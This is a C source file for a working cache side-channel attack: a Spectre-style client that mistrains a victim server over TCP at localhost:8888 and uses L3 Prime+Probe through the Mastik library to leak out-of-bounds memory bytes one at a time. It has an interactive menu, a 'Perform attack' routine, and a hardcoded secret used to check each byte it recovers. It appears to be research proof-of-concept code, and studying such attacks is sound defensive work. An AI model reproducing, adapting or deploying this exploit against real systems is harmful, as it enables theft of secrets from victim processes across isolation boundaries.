#define _GNU_SOURCE

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h> //close

#include <util.h>
#include <l3.h>
#include <low.h>

#include<string.h>    //strlen
#include<sys/socket.h>    //socket
#include<arpa/inet.h> //inet_addr
#include <fcntl.h>
#include <errno.h>

#include <pthread.h>
#include <inttypes.h>
#include <sys/timeb.h>

#include <sys/stat.h>

// Victim Properties
#define ARRAY1_SIZE 16
#define VICTIM_IP "127.0.0.1" //
#define VICTIM_PORT 8888

// Parameters
#define SAMPLES 1000
#define INTERVAL 90000
#define WINDOW 3000000
#define SCORE_THRESHOLD 0.8
#define GAP_THRESHOLD 0.05
#define SCORE_LOWBOUND 0.55
#define TRIES 5
#define SWAP_SLICES_THRESHOLD 0.75
#define SAVE2FILE 0
#define TOMONITOR 1
#define OOS_THRESHOLD 0.05
#define SETUP_SCHED_CHECKS 10
#define MIN_CMPS 30
#define MAX_CMPS MIN_CMPS*5
#define EXTRASPACE 200

// Slices & Macros
#define NSLICES 4
#if NSLICES == 4
#define ADDR2SET(x) 	(int)(((uint64_t)x >> 6) & 0x7ff)
#define RAWSET(set) 	(set & 0x7ff)
#define SLICESBITS 		11
#elif NSLICES == 8
#define ADDR2SET(x) 	(int)(((uint64_t)x >> 6) & 0x3ff)
#define RAWSET(set) 	(set & 0x3ff)
#define SLICESBITS 		10
#endif
#define SLICE(set) 		(set >> SLICESBITS)

#define DELAY(x) for(volatile int z = 0; z < x; z++);

//socket
int sock;
struct sockaddr_in server;
char tmp[256]   = {0};
char message[64] = {0};

//Mastik
l3pp_t l3;

int nsets;
int nslices;

uint32_t array1_size_rawset;
uint32_t array1_size_set;
uint32_t secret_length;

char pp_flag = 0;
volatile int attack_flag = 1;
char pp_oos_err = 0;
int pp_samples;
int pp_interval;
char pp_run;

int Set_To_Probe = 0;
int Global_Count = 0;

pthread_mutex_t lock_pp = PTHREAD_MUTEX_INITIALIZER;

uint16_t monitor_res[SAMPLES*TOMONITOR*EXTRASPACE] = {0};
uint64_t monitor_res_times[SAMPLES*TOMONITOR*EXTRASPACE] = {0};
uint64_t monitor_attack_times[SAMPLES*TOMONITOR*EXTRASPACE] = {0};
int monitor_res_indicator[SAMPLES*TOMONITOR*EXTRASPACE] = {0};

uint64_t interval = INTERVAL;
uint64_t window = WINDOW;
uint64_t samples = SAMPLES;
uint32_t tomonitor = TOMONITOR; //how much sets monitored together in attack
uint32_t save2file = SAVE2FILE;
uint32_t nmonitored = 0; //how much sets are currently monitored
int * monitoredlines;

size_t malicious_x = 0;

unsigned char actual_secret[] = {205, 254, 103,   3, 123,  64,  53, 224,  57,  32,  22, 249,  20,
		130, 241,  75, 170,  76,  66, 178,  62, 190, 237,   6, 191, 132,
		47,  17,  34, 118, 165, 204,  69,  92,  91,  51,  21, 115, 202,
		144, 166,  40, 236,  31,  59,  12, 247, 199, 139, 231, 138,  27,
		5,  46,  23,  43,  90,  24,  41, 160, 113, 253, 222,   8, 112,
		255,  39, 175, 173, 201,  97, 124, 117, 235, 155,  82, 193,  84,
		127, 242, 163, 218, 135, 184, 232, 153, 212, 159,  30,  73,  54,
		150,  79,  96,   7, 154,  44,  35,  83, 223, 214,   2, 186, 176,
		156,  42,  80,  87, 129, 198,  94, 120, 207,  88, 220,  67, 188,
		238, 142, 213,  15, 131, 251,   4, 228,  61,  89, 195,  33,  52,
		18, 164, 110, 183, 107, 133, 180, 128, 177, 215,  70, 210, 125,
		194,  55,  28, 211, 219,  60, 240,  49, 106, 137,  37, 140,  26,
		151, 122, 152, 114,  81,  86,  72,  77, 171,  74, 111, 250,  11,
		248, 102, 227, 206,  85,  65,   9, 162, 109,  93,  38, 225, 143,
		233, 230, 121, 149, 161,  95, 246, 126, 148, 145, 192, 189, 239,
		244, 141,  45, 169, 217, 146, 119, 197,  36, 100, 134, 181,  99,
		182, 226,  58,  56, 245, 104,  98,  50, 116,   0,  25, 221,  68,
		108, 136, 174, 243, 200, 179,  10,  71, 158, 229, 185,  48, 203,
		252,  78, 208, 168, 101, 209,  16,  13, 234,  14,  19, 105,   1,
		29, 157, 172, 147, 187, 167, 196, 216,  63}; // to verify correct / wrong


unsigned char suspected_sets[256] = {0};


__always_inline int flush_raw_set(int c){ // c:0-255
	uint8_t res;
	int set;
	for(int s = 0; s < nslices; s++){
		set = RAWSET(c) | (s << SLICESBITS);
		res = l3_probecount_set(l3,set);
	}
	return res;
}


__always_inline void send_to_victim_x(size_t x){
	//memcpy(message,&x,sizeof(size_t));
	send(sock , &x , sizeof(size_t) , 0);
}


int guard(int n, char * err) { if (n == -1) { perror(err); exit(1); } return n; }

void *primeProbe(void *args){
	int oos;
	int samples, interval;
	char run;
	pthread_mutex_lock(&lock_pp);
	pp_oos_err = 0;
	pthread_mutex_unlock(&lock_pp);
	while(1){
		oos = 0;
		while(1){
			pthread_mutex_lock(&lock_pp);
			if(pp_flag){
				samples = pp_samples;
				interval = pp_interval;
				run = pp_run;
				//				printf("# samples = %d, interval = %d, run = %d\n",samples,interval,run); fflush(stdout);
				pthread_mutex_unlock(&lock_pp);
				break;
			}
			pthread_mutex_unlock(&lock_pp);
		}
		if (run){
			//			oos = l3_repeatedprobecount_with_indicator_and_times(l3,samples,monitor_res,monitor_res_times,monitor_res_indicator,interval,&attack_flag);
			oos = l3_repeatedprobecount_with_indicator(l3,samples,monitor_res,monitor_res_indicator,interval,&attack_flag);
		}
		pthread_mutex_lock(&lock_pp);
		pp_oos_err |= (oos >= samples * OOS_THRESHOLD);
		if(oos >= samples * OOS_THRESHOLD && run)
			printf("# pp_oos_err = %d / %d\n",oos,samples); fflush(stdout);
		pp_flag = 0;
		pthread_mutex_unlock(&lock_pp);
		if (!run)
			break;
	}
	printf("# waiting for join...\n");
	return EXIT_SUCCESS;
}

void set_pp_params(char run, int samples, int interval){
	//	debug - printf("# set_pp_params(%d,%d,%d)\n",run,samples,interval); fflush(stdout);
	pthread_mutex_lock(&lock_pp);
	pp_run = run;
	pp_samples = samples;
	pp_interval = interval;
	pp_flag = 1;
	pthread_mutex_unlock(&lock_pp);
}

int get_pp_flag(){
	//	debug - printf("get_pp_flag\n"); fflush(stdout);
	char res;
	pthread_mutex_lock(&lock_pp);
	res = pp_flag;
	pthread_mutex_unlock(&lock_pp);
	return res;
}

int get_pp_oos_err(){
	//	debug - printf("get_pp_oos_err\n"); fflush(stdout);
	char res;
	pthread_mutex_lock(&lock_pp);
	res = pp_oos_err;
	pthread_mutex_unlock(&lock_pp);
	return res;
}
int uint32Input() {
	char input[64];
	printf ("> ");
	fflush(stdout);
	uint32_t result;

	if (fgets(input, 64, stdin) != NULL) {
		result = atoi(input);
	} else {
		perror("input");
	}
	return result;
}

int uint64Input() {
	char input[64];
	printf ("> ");
	fflush(stdout);
	uint64_t result;

	if (fgets(input, 64, stdin) != NULL) {
		result = strtoul(input,NULL,10);
	} else {
		perror("input");
	}
	return result;
}

void scoring(int * num_of_comps, float * scores, int * activity, int * oos, int nmonitored,int samples){
	int startIdx = 0;
	//	while(monitor_res_indicator[startIdx]) //skip first "attack"
	//		startIdx++;
	//	while(!monitor_res_indicator[startIdx]) //skip first "idle"
	//		startIdx++;
	//		printf("# startIdx = %d\n",startIdx);
	for (int offset = 0; offset < nmonitored; offset++){
		uint32_t attack_misses = 0;
		uint32_t idle_misses = 0;
		uint32_t attack_len = 0;
		uint32_t idle_len = 0;

		//		unsigned char c = (monitoredlines[offset]*4)/4; //convert set to relevant character;
		num_of_comps[offset] = 0;
		for(int i = startIdx+offset; i < samples*nmonitored; i+=nmonitored){
			if(monitor_res[i] == (uint16_t)-1){
				if (NULL != oos) oos[offset]++;
				continue;
			} else if (monitor_res[i] > 0){
				if (NULL != activity) activity[offset]++;
			}
			if(monitor_res_indicator[i]){ 		//indicator = attack
				attack_len++;
				attack_misses += monitor_res[i];
			} else { 							//indicator = idle
				idle_len++;
				idle_misses += monitor_res[i];
			}
			if(i > startIdx+offset && monitor_res_indicator[i-nmonitored] == 0 && monitor_res_indicator[i] == 1){ // now we have {attack samples, idle samples} time to compare
				num_of_comps[offset]++;
				//					printf("# c = %d, attack len = %d, idle_len = %d\n",c,attack_len,idle_len);
				float attack_avg = (float)attack_misses / attack_len;
				float idle_avg = (float)idle_misses / idle_len;
				scores[offset] += (attack_avg) > (idle_avg);
				//					printf("attack_avg  = %f, idle_avg = %f\n",attack_avg,idle_avg);
				attack_len = 0; idle_len = 0; attack_misses = 0; idle_misses = 0;
			}
		}
		//		printf("# char = %d\n",c); fflush(stdout);
		//		scores[offset] = scores[offset] / (num_of_comps[offset]);
		//		printf("# score = %f\n",scores[c]);
	}
}


int readMemoryByte(size_t x, unsigned char * value) {
	uint32_t set;
	uint64_t s,t;
	float scores[256] = {0};
	float scores_tmp[256] = {0};
	int num_of_comps[256] = {0};
	int num_of_comps_tmp[256] = {0};
	//	printf("Secret Index: %d\n",secret_index);

	char ok = 0;

	while(!ok){
		int scouted_sets = 0;
		for(int set_offset=0;set_offset<256/tomonitor;set_offset++){
			int count_tmp = 0;
			int set_start_index;
			for(set_start_index=0;set_start_index<256;set_start_index++){
				if(suspected_sets[set_start_index]==0){
					count_tmp++;
					if((count_tmp-1)/tomonitor==set_offset)
						break;
				}

			}

			l3_unmonitorall(l3);
			count_tmp = 0;
			//			printf("batch num %d, starting from index=%d \n", set_offset, set_start_index);
			for (; count_tmp < tomonitor && set_start_index<256; set_start_index++){
				if(suspected_sets[set_start_index]==0){
					count_tmp++;
					scouted_sets++;
					l3_monitor(l3,set_start_index*4);
				}
			}

			nmonitored = l3_getmonitoredset(l3,monitoredlines,nsets);
			//			printf("nmonitored = %d\n", nmonitored);
			if(nmonitored==0){
				break;
			}

			size_t train_x = 0;
			uint64_t attack_state = 1;
			int count_send = 0;

			set_pp_params(1,samples,interval);
			while(get_pp_flag()){ //until pp end
				s = rdtscp64();
				t = 0;
				while(t < window){
					DELAY(166);
					send_to_victim_x(train_x);
					DELAY(166);
					send_to_victim_x(train_x);
					DELAY(166);
					flush_raw_set(array1_size_rawset);

					memaccess(&x);
					memaccess(&count_send);
					if (attack_flag){
						send_to_victim_x(x);
						//monitor_attack_times[count_send] = rdtscp64();
						count_send ++;
					}else{
						send_to_victim_x(x-(train_x & 0x1 ? -1 : 1));
					}
					t = rdtscp64() - s;
				}
				attack_state = (attack_state + 1) & 0x7;
				attack_flag = attack_state & 0x1;
				train_x = (attack_state >> 1) & 0x3;
			}


			bzero(scores_tmp,256*sizeof(float));
			bzero(num_of_comps_tmp,256*sizeof(int));
			scoring(num_of_comps_tmp,scores_tmp,NULL,NULL,nmonitored,samples);

			for(int tmpi=0;tmpi<nmonitored;tmpi++){
				//				printf("score for set %d (%d) : %f / (%d) = %f\n",monitoredlines[tmpi],monitoredlines[tmpi]/4,scores_tmp[tmpi],num_of_comps_tmp[tmpi],scores_tmp[tmpi]/num_of_comps_tmp[tmpi]);
				scores[monitoredlines[tmpi]/4]+=scores_tmp[tmpi];
				num_of_comps[monitoredlines[tmpi]/4]+=num_of_comps_tmp[tmpi];
			}

			l3_unmonitorall(l3);


		}

		int j,k,i;
		j = k = -1;
		for (i = 0; i < 256; i++) {
			if (j < 0 || scores[i]/num_of_comps[i] >= scores[j]/num_of_comps[j]) {
				k = j;
				j = i;
			} else if (k < 0 || scores[i]/num_of_comps[i] >= scores[k]/num_of_comps[k]) {
				k = i;
			}
		}
		printf("1st = %d, score = %f (%d) , 2nd = %d, score = %f (%d) , Gap = %f,sets=%d\n",j,scores[j]/num_of_comps[j],num_of_comps[j],k,scores[k]/num_of_comps[k],num_of_comps[k], (scores[j]/num_of_comps[j]-scores[k]/num_of_comps[k]),scouted_sets);
		int place = 1;
		unsigned char real_value = actual_secret[(x-malicious_x)%256];
		for (int tmpi = 0; tmpi < 256; tmpi++){
			if(scores[tmpi]/num_of_comps[tmpi] > scores[real_value]/num_of_comps[real_value])
				place++;
		}
		printf("Real Set Place = %d with score %.2f (%.2f / %d)\n",place,scores[real_value]/num_of_comps[real_value],scores[real_value],num_of_comps[real_value]);
		ok = ((scores[j]/num_of_comps[j] > SCORE_THRESHOLD) && ((scores[j]/num_of_comps[j]-scores[k]/num_of_comps[k]) > GAP_THRESHOLD)) && num_of_comps[j]>MIN_CMPS;
		*value = j;
		if(num_of_comps[j]>MAX_CMPS || scouted_sets==0){
			break;
		}
		if(!ok){
			for (int tmpi = 0; tmpi < 256; tmpi++) {
				if(num_of_comps[tmpi] > 0 && scores[tmpi]/num_of_comps[tmpi]<SCORE_LOWBOUND){
					suspected_sets[tmpi]=1;
				}
			}
		}

	}
	return (ok ? *value : -1);

}

void scanRawSetForSpecificX(size_t chosen_x, uint8_t chosen_value, char swap){
	if(chosen_x >= ARRAY1_SIZE){
		printf("warning: chosen_x (%lu) > array1_size (%d)\n",chosen_x,ARRAY1_SIZE); fflush(stdout);
	}

	float scores[NSLICES] = {0};
	int activity[NSLICES] = {0};
	int num_of_comps[NSLICES] = {0};
	int oos[NSLICES] = {0};

	uint32_t rawset = chosen_value * 4;


	for (int i = rawset; i < nsets; i+=nsets/nslices){
		l3_unmonitorall(l3);
		l3_monitor(l3,i);
		set_pp_params(1,samples,interval);
		uint64_t s,t;
		while(get_pp_flag()){ //until pp end
			s = rdtscp64();
			t = 0;
			while(t < window){
				DELAY(500);
				if (attack_flag){
					send_to_victim_x(chosen_x);
				}else{
					send_to_victim_x(chosen_x - 1);
				}
				t = rdtscp64() - s;
			}
			attack_flag = !attack_flag;
		}

		scoring(num_of_comps+SLICE(i),scores+SLICE(i),activity+SLICE(i),oos+SLICE(i),1,samples);
	}

	//	for(int i = 0; i < nslices; i ++){
	//		printf("Slice %d: %.2f%% (%.2f%%) %d\n",i,(float)activity[i]/samples * 100,(float)oos[i]/samples * 100,rawset + i*1024);
	//	}

	for(int i = 0; i < nslices; i ++){
		printf("Slice %d: %.2f (%d), activity = %d, oos = %d, set %d\n",i,scores[i]/num_of_comps[i],num_of_comps[i],activity[i],oos[i],rawset+i*nsets/nslices);
	}

	int max_slice = 0;
	int candidates = 0;
	for(int i = 0; i < nslices; i++){ //todo auto swap
		if(scores[i]/num_of_comps[i] > scores[max_slice]/num_of_comps[max_slice])
			max_slice = i;
		candidates += scores[i]/num_of_comps[i] > SWAP_SLICES_THRESHOLD;
	}
	char doSwap = swap;

	printf("max_slice = %d, candidates = %d\n",max_slice,candidates);

	if (candidates == 1 && max_slice){
		if (!swap){
			printf("Swap?\n"); fflush(stdout);
			doSwap = uint32Input();
		}
		if (doSwap){
			l3_swapslices(l3,0,max_slice);
			printf("Slices 0,%d swapped.\n",max_slice); fflush(stdout);
		}
	}

	l3_unmonitorall(l3);
}


int main(int argc, const char **argv)
{
	delayloop(3000000000U);
	l3 = l3_prepare(NULL);
	nsets = l3_getSets(l3);
	nslices = l3_getSlices(l3);
	monitoredlines = calloc(nsets,sizeof(int));
	printf("Sets : %d, Slices : %d\n",nsets,nslices); fflush(stdout);

	for (int i = 0; i < nsets; i ++)
		l3_monitor(l3,i);
	l3_unmonitorall(l3);

	//	//Create socket
	guard(sock = socket(AF_INET , SOCK_STREAM , 0),"Could not create socket");
	//	guard(sock = socket(AF_INET , SOCK_STREAM , IPPROTO_UDP),"Could not create socket");
	puts("Socket created");
	server.sin_addr.s_addr = inet_addr(VICTIM_IP);
	server.sin_family = AF_INET;
	server.sin_port = htons( VICTIM_PORT );
	guard(connect(sock , (struct sockaddr *)&server , sizeof(server)),"Could not connect");
	puts("Connected\n");

	uint64_t s,t;
	pthread_t pp_thread;
	int count;
	char oos_err;
	char thread_setup_done = 0;
	while(!thread_setup_done){ //repeat until the threads do not context switch between them
		if (pthread_create(&pp_thread, NULL, &primeProbe, (void*)NULL)) {
			printf("pthread_create failed\n"); fflush(stdout);
			return EXIT_FAILURE;
		}

		for (int i = 0; i < SETUP_SCHED_CHECKS; i++){
			set_pp_params(1,samples,interval);

			//send x until pp end
			s = rdtscp64();
			t = 0;
			count = 0;
			while(get_pp_flag()){
				send_to_victim_x(0);
				count++;
			}
			printf("# sent %d tcp's\n",count); fflush(stdout);

			oos_err = get_pp_oos_err();

			if (oos_err){ //set thread to finish and wait
				set_pp_params(0,0,0);
				while(get_pp_flag());
				break;
			}

		}
		if (!oos_err){
			printf("# thread setup done!\n"); fflush(stdout);
			thread_setup_done = 1;
		} else {
			printf("# thread setup failed, trying again...\n"); fflush(stdout);
			if (pthread_join(pp_thread, NULL)) {
				printf("# pthread_join failed\n"); fflush(stdout);
				exit(EXIT_FAILURE);
			} else {
				printf("# pthread_join success\n");
			}
		}
		DELAY(2000);
	}


	array1_size_rawset = 0;
	secret_length = 1;
	if (argc > 1)
		malicious_x = strtoul(argv[1],NULL,10);
	if (argc > 2)
		array1_size_rawset = atoi(argv[2]);
	if (argc > 3)
		secret_length = atoi(argv[3]);

	delayloop(300000U);

	int option = -1;
	uint64_t tmp64;
	uint32_t tmp32;
	printf("right format ./prog <malicious_x> <array1_size_rawset> <secret_length>\n");
	while(option != 99){
		printf("--------------------------------------------\n");
		printf("malicious_x = %lu, array1_size_rawset = %u, secret_length = %u\n",malicious_x,array1_size_rawset,secret_length);
		printf("interval = %lu, samples = %lu, window = %lu, tomonitor = %u,save2file = %u\n",interval,samples,window,tomonitor,save2file);

		printf("1) Set malicious_x\n");
		printf("3) Set array1_size_rawset\n");
		printf("4) Set secret_length\n");
		printf("5) Set interval \t(PRIME+PROBE sample slot) \t[cpu ticks]\n");
		printf("6) Set samples \t\t(PRIME+PROBE samples) \t\t[cpu ticks]\n");
		printf("7) Set window \t\t(activity ON/OFF window) \t[cpu ticks]\n");
		printf("8) Set tomonitor \t(how much sets to monitor in parallel each scan)\n");
		printf("10) Swap slices\n");
		printf("11) Check activity on rawset by chosen secret\n");
		printf("12) Perform attack\n");
		printf("13) Set save2file (attack results will be saved under results)\n");
		printf("99) Exit\n");
		printf("debug menu: nmonitored = %d\n",l3_getmonitoredset(l3,NULL,0));
		printf("101) Monitor set\n");
		printf("102) Unmonitor set\n");
		printf("103) Unmonitor all\n");
		printf("104) Print monitored sets\n");
		printf("105) Prime & Probe monitored sets\n");

		fflush(stdout);
		option = uint32Input();

		switch(option){
		case 1:
			printf("Enter malicious_x: \n");
			fflush(stdout);
			malicious_x = uint64Input();
			break;
		case 3:
			printf("Enter array1_size_rawset: \n");
			fflush(stdout);
			array1_size_rawset = uint32Input();
			break;
		case 4:
			printf("Enter secret_length: \n");
			fflush(stdout);
			secret_length = uint32Input();
			break;
		case 5:
			printf("Enter interval: \n");
			fflush(stdout);
			tmp64 = uint64Input();
			interval = tmp64 ? tmp64 : INTERVAL;
			break;
		case 6:
			printf("Enter samples: \n");
			fflush(stdout);
			tmp64 = uint64Input();
			samples = tmp64 ? tmp64 : SAMPLES;
			break;
		case 7:
			printf("Enter window: \n");
			fflush(stdout);
			tmp64 = uint64Input();
			window = tmp64 ? tmp64 : WINDOW;
			break;
		case 8:
			printf("Enter tomonitor: \n");
			fflush(stdout);
			tomonitor = uint32Input();
			break;
		case 10:
			printf("Swap Slices\n");
			{
				uint32_t s1 = 0;
				uint32_t s2 = 0;

				printf("Select slice A num (0-%d): ",nslices-1); fflush(stdout);
				s1 = uint32Input();
				if (s1 < 0 || s1 >= nslices) {
					printf("invalid slice number!\n");
					break;
				}

				printf("Select slice B num (0-%d): ",nslices-1); fflush(stdout);

				s2 = uint32Input();

				if (s2 < 0 || s2 >= nslices) {
					printf("invalid slice number!\n"); fflush(stdout);
					break;
				}

				l3_swapslices(l3,s1,s2);
			}
			break;
		case 11:
			fflush(stdout);
			{
				uint64_t chosen_x; uint8_t chosen_value;
				printf("Enter chosen x:\n"); fflush(stdout);
				chosen_x = uint64Input();
				printf("Enter expected value:\n"); fflush(stdout);
				chosen_value = uint32Input();
				scanRawSetForSpecificX(chosen_x,chosen_value,0);
			}
			break;
		case 12:
			printf("Reading %d bytes:\n", secret_length);
			{
				struct timeb start, end;
				int diff,nsucc = 0;
				int res;
				uint64_t total_time = 0;
				unsigned char value;
				for (int i = 0; i < secret_length; i++){
					bzero(suspected_sets,256*sizeof(unsigned char));
					//					for (int tmpi = 0; tmpi<256;tmpi++){
					//						if(tmpi!=205)
					//							suspected_sets[tmpi]=1;
					//					}
					printf("Reading at malicious_x = %lu\n", malicious_x + i); fflush(stdout);
					ftime(&start);
					res = readMemoryByte(malicious_x + i,&value);
					ftime(&end);
					diff = (int) (1000.0 * (end.time - start.time) + (end.millitm - start.millitm));
					printf("Operation took %u milliseconds\n", diff);
					total_time+=diff;
					if(value==actual_secret[i%256]){
						nsucc++;
						printf("Right!\n");
					} else{
						printf("Wrong (%d)!\n",actual_secret[i%256]);
					}
					printf("Psuc = (%d / %d) \t Average time = (%lu / %d) ms\n\n", nsucc, i+1,total_time, i+1);
				}

				printf("Psuc = (%d / %d) \t Average time = (%lu / %d) ms\n", nsucc, secret_length,total_time, (secret_length));
			}
			break;
		case 13:
			printf("Enter save2file: \n"); fflush(stdout);
			save2file = uint32Input();
			break;
		case 99:
			printf("Bye Bye... \n");
			break;
		case 101:
			printf("Enter set to monitor: \n"); fflush(stdout);
			tmp32 = uint32Input();
			l3_monitor(l3,tmp32);
			break;
		case 102:
			printf("Enter set number to unmonitor: \n"); fflush(stdout);
			tmp32 = uint32Input();
			l3_unmonitor(l3,tmp32);
			break;
		case 103:
			l3_unmonitorall(l3);
			break;
		case 104:
			tmp32 = l3_getmonitoredset(l3,monitoredlines,nsets);
			for (int i = 0; i < tmp32; i++){
				printf("%d) %d\n",i,monitoredlines[i]);
			}
			break;
		case 105:
			nmonitored = l3_getmonitoredset(l3,monitoredlines,nsets);
			set_pp_params(1,samples,interval);
			while(get_pp_flag()); //until pp end
			{
				FILE *f_monitor_res;
				FILE *f_monitor_res_times;
				char str[64];
				struct stat st = {0};
				if (stat("debug_results", &st) == -1) {
					mkdir("debug_results", 0700);
				}
				for (int offset = 0; offset < nmonitored; offset++){
					int actual_set = monitoredlines[offset];
					uint16_t * monitor_res_divided = calloc(samples,sizeof(uint16_t));
					uint64_t * monitor_res_times_divided = calloc(samples,sizeof(uint64_t));
					int count_activity = 0;
					int count_oos = 0;
					for (int i = 0; i < samples; i++){
						monitor_res_divided[i] = monitor_res[offset + nmonitored*i];
						monitor_res_times_divided[i] = monitor_res_times[offset + nmonitored*i];
						if (monitor_res_divided[i] == (uint16_t)-1)
							count_oos++;
						else if(monitor_res_divided[i] > 0)
							count_activity++;
					}
					printf("set %d: %.2f%% (%.2f%%)\n",actual_set,(float)count_activity/samples * 100,(float)count_oos/samples * 100);

					sprintf(str,"debug_results/monitor_res_%d",actual_set);
					f_monitor_res = fopen(str, "w+");

					sprintf(str,"debug_results/monitor_res_times_%d",actual_set);
					f_monitor_res_times = fopen(str, "w+");

					fwrite(monitor_res_divided, sizeof(uint16_t), samples, f_monitor_res);
					fwrite(monitor_res_times_divided, sizeof(uint64_t), samples, f_monitor_res_times);

					fclose(f_monitor_res);
					fclose(f_monitor_res_times);

					free(monitor_res_divided);
					free(monitor_res_times_divided);
				}
			}
			break;
		}


	}

	free(monitoredlines);
	close(sock);
	l3_release(l3);

	return EXIT_SUCCESS;
}
